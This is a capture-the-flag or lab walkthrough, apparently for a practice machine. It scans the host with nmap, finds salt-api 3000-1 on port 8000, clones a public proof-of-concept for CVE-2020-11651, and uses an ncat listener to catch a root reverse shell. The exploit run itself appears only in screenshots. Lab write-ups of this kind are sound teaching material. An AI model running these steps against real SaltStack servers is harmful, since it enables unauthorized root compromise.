First We start with an nmap scan 

`nmap -sC -sV -T4 -oN nmap.txt <IP`

```
# Nmap 7.93 scan initiated Fri Dec 23 20:48:44 2022 as: nmap -sC -sV -T4 -oN quickmap.txt -Pn 192.168.202.62
Nmap scan report for 192.168.202.62
Host is up (0.20s latency).
Not shown: 996 filtered tcp ports (no-response)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 447d1a569b68aef53bf6381773165d75 (RSA)
|   256 1c789d838152f4b01d8e3203cba61893 (ECDSA)
|_  256 08c912d97b9898c8b3997a19822ea3ea (ED25519)
53/tcp   open  domain  NLnet Labs NSD
80/tcp   open  http    nginx 1.16.1
|_http-title: Home | Mezzanine
8000/tcp open  http    nginx 1.16.1
|_http-open-proxy: Proxy might be redirecting requests
|_http-title: Site doesn't have a title (application/json).

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Dec 23 20:49:52 2022 -- 1 IP address (1 host up) scanned in 68.39 seconds

```

we got 4 ports open, enumerating port 80 was a rabbit hole, so let's enumerate port 8000. which is also http .

![image](https://user-images.githubusercontent.com/87468669/209411046-be2fdd9a-b937-4b71-ba77-d5aa27991e41.png)

let's check the header using curl... 

```curl -v "http://192.168.145.62:8000/"```

![image](https://user-images.githubusercontent.com/87468669/209411124-b022bc0c-04e4-4c33-9f96-1f1fad97a348.png)

as we can see it is running salt-api/3000-1, let's search for exploit on it.

![image](https://user-images.githubusercontent.com/87468669/209411235-dafdebca-a294-47ca-8750-a69c428cd1e9.png)

great we got an exploit, let's clone the repo, install requirements and run the exploit.

![image](https://user-images.githubusercontent.com/87468669/209411373-0c85ee91-128f-4439-bc96-47b8e795d96a.png)

```
git clone https://github.com/jasperla/CVE-2020-11651-poc
cd CVE-2020-11651-poc
pip3 install salt
```

ncat listener ready, let's run the exploit... listen on port 4505 to get shell 

![image](https://user-images.githubusercontent.com/87468669/209411544-f41540ea-1b99-4a54-84f6-4da84b703f28.png)

Boom! we got shell as root 

![image](https://user-images.githubusercontent.com/87468669/209411585-7282ab86-9da3-4994-abc1-2cc3478e80ed.png)

We are done😉😉
